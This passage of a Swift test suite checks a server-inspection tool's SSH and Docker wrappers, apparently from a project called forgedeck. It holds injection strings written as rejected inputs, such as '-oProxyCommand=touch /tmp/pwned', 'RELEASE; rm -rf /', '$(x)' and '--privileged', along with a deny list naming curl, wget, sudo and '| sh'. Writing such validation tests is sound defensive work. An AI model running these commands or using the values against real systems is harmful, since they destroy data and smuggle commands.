            #expect(request.arguments.contains("StrictHostKeyChecking=yes"))
            #expect(request.arguments.contains("BatchMode=yes"))
        }
    }

    @Test func anInvalidAliasNeverReachesSSH() async {
        let runner = FakeRunner(result: ProcessResult(exitCode: 0, stdout: "up 3 days"))
        let inspector = SSHInspector(runner: runner)
        let result = await inspector.probe(alias: "-oProxyCommand=touch /tmp/pwned", command: SSHProbeCommand.find("uptime")!)
        #expect(!result.ok)
        #expect(result.problem == .notConfigured)
        let observation = await inspector.release(alias: "host;id", path: "/srv/app/RELEASE")
        #expect(observation.problem == .notConfigured)
        #expect(await inspector.resolved(alias: "-G") == nil)
        #expect(await inspector.hostKeyIsKnown(alias: "bad alias") == false)
        #expect(runner.requests.isEmpty)
    }

    @Test func aSuccessfulProbeReturnsRedactedOutput() async {
        let token = "ghp_" + String(repeating: "k3", count: 15)
        let runner = FakeRunner(result: ProcessResult(exitCode: 0, stdout: "up 3 days, token \(token)\n"))
        let result = await SSHInspector(runner: runner).probe(alias: "prod-1", command: SSHProbeCommand.find("uptime")!)
        #expect(result.ok)
        #expect(result.problem == nil)
        #expect(result.output.contains("up 3 days"))
        #expect(!result.output.contains(token))
    }

    @Test func timeoutsAndLaunchFailures() async {
        let slow = FakeRunner(result: ProcessResult(exitCode: 15, timedOut: true))
        #expect(await SSHInspector(runner: slow).probe(alias: "prod-1", command: SSHProbeCommand.find("uptime")!).problem == .timeout)
        let broken = FakeRunner { _ in throw ProcessError.notFound("ssh") }
        let result = await SSHInspector(runner: broken).probe(alias: "prod-1", command: SSHProbeCommand.find("uptime")!)
        #expect(result.problem == .unavailable)
        #expect(!result.ok)
        let refused = FakeRunner(result: ProcessResult(exitCode: 255, stderr: "deploy@prod-1: Permission denied (publickey)."))
        #expect(await SSHInspector(runner: refused).probe(alias: "prod-1", command: SSHProbeCommand.find("uptime")!).problem == .unauthorized)
    }

    @Test func aReleaseFileBecomesAVerifiedObservation() async {
        let json = "{\"commit_sha\": \"\(shaB.uppercased())\", \"version\": \"v3.1.0\", \"deployed_at\": \"2026-01-02T03:04:05Z\"}\n"
        let runner = FakeRunner(result: ProcessResult(exitCode: 0, stdout: json))
        let observation = await SSHInspector(runner: runner).release(alias: "prod-1", path: "/srv/app/RELEASE.json", ttl: 300)
        #expect(observation.sha == shaB)
        #expect(observation.version == "v3.1.0")
        #expect(observation.deployedAt != nil)
        #expect(observation.problem == nil)
        #expect(observation.provenance.level == .verified)
        #expect(observation.provenance.source == .sshInspection)
        #expect(runner.requests.first?.arguments.last == "cat -- /srv/app/RELEASE.json")

        let bare = FakeRunner(result: ProcessResult(exitCode: 0, stdout: "\(shaC)\n"))
        let fromBare = await SSHInspector(runner: bare).release(alias: "prod-1", path: "/srv/app/REVISION")
        #expect(fromBare.sha == shaC)
        #expect(fromBare.provenance.level == .verified)
    }

    @Test func aReleaseFileWithoutACommitIsNotVerified() async {
        for output in ["", "hello world", "{\"note\": \"nothing useful\"}", "{\"commit_sha\": \"main\"}", "--upload-pack=x"] {
            let runner = FakeRunner(result: ProcessResult(exitCode: 0, stdout: output))
            let observation = await SSHInspector(runner: runner).release(alias: "prod-1", path: "/srv/app/RELEASE")
            #expect(observation.problem == .malformed, "\(output)")
            #expect(observation.provenance.level == .unknown, "\(output)")
            #expect(observation.sha == nil)
        }
    }

    @Test func releasePathsAreLimitedToPlainAbsolutePaths() async {
        for path in ["/srv/app/RELEASE; rm -rf /", "/srv/$(x)", "/srv/`id`", "/srv/../etc/shadow", "..", "relative/path", "RELEASE", "",
                     "/srv/app/my release", "/srv/app/RELEASE\n/etc/passwd", "/srv/app/x|y", "/srv/app/x>y", "/srv/app/'x'", "/srv/app/x&",
                     "/srv/ünï", "/" + String(repeating: "a", count: 300), "-/srv"] {
            #expect(SSHProbeCommand.release(path: path) == nil, "\(path)")
        }
        #expect(SSHProbeCommand.release(path: "/srv/app/RELEASE.json")?.remote == "cat -- /srv/app/RELEASE.json")
        #expect(SSHProbeCommand.release(path: "/var/www/my-app_2/current/REVISION")?.id == "release")

        let runner = FakeRunner(result: ProcessResult(exitCode: 0, stdout: shaA))
        let observation = await SSHInspector(runner: runner).release(alias: "prod-1", path: "/srv/app/RELEASE; rm -rf /")
        #expect(observation.problem == .notConfigured)
        #expect(runner.requests.isEmpty)
    }

    @Test func theProbeCatalogIsFixed() {
        #expect(SSHProbeCommand.catalog.map(\.id) == ["uptime", "disk", "memory", "docker", "os"])
        #expect(SSHProbeCommand.find("uptime")?.remote == "uptime")
        for id in ["release", "rm -rf /", "", "UPTIME", "uptime; id", "shell"] {
            #expect(SSHProbeCommand.find(id) == nil, "\(id)")
        }
        // Nothing in the catalog writes, escalates, or downloads.
        for command in SSHProbeCommand.catalog {
            for word in ["rm ", "sudo", "curl", "wget", "mv ", "chmod", "tee", ">>", "| sh", "bash"] {
                #expect(!command.remote.contains(word), "\(command.id) contains \(word)")
            }
        }
        #expect(Set(SSHHostConfig().allowedProbeIDs).isSubset(of: Set(SSHProbeCommand.catalog.map(\.id))))
    }

    @Test func configParsing() {
        let hosts = SSHConfig.parse("""
        # Production
        Host prod-1 prod-alias
            HostName 203.0.113.10
            User deploy
            Port 2222
            IdentityFile ~/.ssh/id_ed25519

        Host *.internal !bastion.internal staging-?
            User ops

        host=bastion
          hostname = bastion.example.com

        Match host *.example.com
            User nobody

        Host -oProxyCommand=evil
            HostName evil.example
        """)
        #expect(hosts.map(\.alias) == ["prod-1", "prod-alias", "bastion"])
        #expect(hosts[0] == SSHConfigHost(alias: "prod-1", hostName: "203.0.113.10", user: "deploy", port: "2222"))
        #expect(hosts[1].hostName == "203.0.113.10" && hosts[1].port == "2222")
        #expect(hosts[2].hostName == "bastion.example.com")
        #expect(hosts[2].user == nil)
        #expect(SSHConfig.parse("").isEmpty)
        #expect(SSHConfig.load(path: "/nonexistent/forgedeck-tests/ssh-config").isEmpty)
    }

    @Test func resolvedHostAndKnownHostLookup() async {
        let runner = FakeRunner { request in
            if request.executable.lastPathComponent == "ssh" {
                return ProcessResult(exitCode: 0, stdout: "user deploy\nhostname 203.0.113.10\nport 2222\n")
            }
            return ProcessResult(exitCode: 0, stdout: "# Host [203.0.113.10]:2222 found: line 4\n")
        }
        let inspector = SSHInspector(runner: runner)
        let target = await inspector.resolved(alias: "prod-1")
        #expect(target?.host == "203.0.113.10")
        #expect(target?.port == "2222")
        #expect(await inspector.hostKeyIsKnown(alias: "prod-1"))
        let keygen = runner.requests.last
        #expect(keygen?.executable.lastPathComponent == "ssh-keygen")
        #expect(keygen?.arguments == ["-F", "[203.0.113.10]:2222"])
        #expect(runner.requests.first?.arguments == ["-G", "--", "prod-1"])

        let unknown = FakeRunner { request in
            request.executable.lastPathComponent == "ssh" ? ProcessResult(exitCode: 0, stdout: "hostname web01\nport 22\n") : ProcessResult(exitCode: 1)
        }
        #expect(await SSHInspector(runner: unknown).hostKeyIsKnown(alias: "web01") == false)
        #expect(unknown.requests.last?.arguments == ["-F", "web01"])
    }
}

@Suite struct DockerTests {
    private let dockerURL = URL(fileURLWithPath: "/usr/local/bin/docker")

    @Test func psLinesAreParsed() {
        let output = """
        {"Command":"\\"nginx -g 'daemon off;'\\"","ID":"abc123def456","Image":"nginx:1.27","Labels":"com.docker.compose.project=acme,com.docker.compose.service=web","Names":"acme-web-1","State":"running","Status":"Up 3 hours"}
        {"ID":"fed654cba321","Image":"postgres:16","Labels":"maintainer=someone","Names":"standalone-db","State":"Exited","Status":"Exited (0) 2 days ago"}
        not json at all
        {"Image":"no-id"}
        {"ID":"0011223344"}
        """
        let containers = DockerInspector.parse(output)
        #expect(containers.count == 3)
        #expect(containers[0] == DockerContainer(id: "abc123def456", name: "acme-web-1", image: "nginx:1.27", state: "running",
                                                 status: "Up 3 hours", composeProject: "acme"))
        #expect(containers[0].isRunning)
        #expect(containers[1].state == "exited")
        #expect(!containers[1].isRunning)
        #expect(containers[1].composeProject == nil)
        #expect(containers[2].name == "0011223344")
        #expect(DockerInspector.parse("").isEmpty)
    }

    @Test func containersUsesAFixedArgumentList() async {
        let runner = FakeRunner(result: ProcessResult(exitCode: 0, stdout: "{\"ID\":\"abc\",\"Names\":\"web\",\"State\":\"running\"}\n"))
        let result = await DockerInspector(runner: runner, docker: dockerURL).containers()
        #expect(result.value?.map(\.name) == ["web"])
        #expect(runner.requests.first?.arguments == ["ps", "--all", "--no-trunc", "--format", "{{json .}}"])
        #expect(runner.requests.first?.executable == dockerURL)
    }

    @Test func aStoppedDaemonIsUnavailable() async {
        let runner = FakeRunner(result: ProcessResult(exitCode: 1, stderr: "Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?\n"))
        let result = await DockerInspector(runner: runner, docker: dockerURL).containers()
        #expect(result.problem == .unavailable)
        #expect(result.detail == "Docker is installed but the daemon is not running.")
        #expect(result.value == nil)
    }

    @Test func otherDockerFailures() async {
        let denied = FakeRunner(result: ProcessResult(exitCode: 1, stderr: "permission denied while trying to connect to the Docker daemon socket"))
        #expect(await DockerInspector(runner: denied, docker: dockerURL).containers().problem == .forbidden)
        let slow = FakeRunner(result: ProcessResult(exitCode: 15, timedOut: true))
        #expect(await DockerInspector(runner: slow, docker: dockerURL).containers().problem == .timeout)
        let broken = FakeRunner { _ in throw ProcessError.launchFailed("no") }
        #expect(await DockerInspector(runner: broken, docker: dockerURL).containers().problem == .unavailable)
        let odd = FakeRunner(result: ProcessResult(exitCode: 2, stderr: "error: token=abcdef123456 rejected\nmore"))
        let result = await DockerInspector(runner: odd, docker: dockerURL).containers()
        #expect(result.problem == .unavailable)
        #expect(!result.detail.contains("abcdef123456"))
    }

    @Test func withoutTheCLINothingRuns() async {
        let runner = FakeRunner(result: ProcessResult(exitCode: 0))
        let inspector = DockerInspector(runner: runner, docker: nil)
        #expect(!inspector.isInstalled)
        #expect(await inspector.containers().problem == .notConfigured)
        #expect(await inspector.logs(container: "web").problem == .notConfigured)
        #expect(await inspector.context() == nil)
        #expect(runner.requests.isEmpty)
    }

    @Test func containerNameValidation() async {
        for name in ["web", "acme-web-1", "db_1", "a.b", "abc123def456"] {
            #expect(DockerInspector.isValidName(name), "\(name)")
        }
        for name in ["", "-v", "--privileged", "web; rm -rf /", "web $(id)", "a/b", "web\n", "wéb", String(repeating: "a", count: 129)] {
            #expect(!DockerInspector.isValidName(name), "\(name)")
        }
        let runner = FakeRunner(result: ProcessResult(exitCode: 0, stdout: "log"))
        #expect(await DockerInspector(runner: runner, docker: dockerURL).logs(container: "--privileged").problem == .notConfigured)
        #expect(runner.requests.isEmpty)
    }

    @Test func logsAreBoundedAndRedacted() async {
        let token = "sk_live_" + String(repeating: "9aZ", count: 8)
        let runner = FakeRunner(result: ProcessResult(exitCode: 0, stdout: "started\nkey \(token)\n", stderr: "warn\n"))
        let result = await DockerInspector(runner: runner, docker: dockerURL).logs(container: "web", tail: 50_000)
        #expect(result.value?.contains("started") == true)
        #expect(result.value?.contains("warn") == true)
        #expect(result.value?.contains(token) == false)
        #expect(runner.requests.first?.arguments == ["logs", "--tail", "1000", "--", "web"])
    }
}
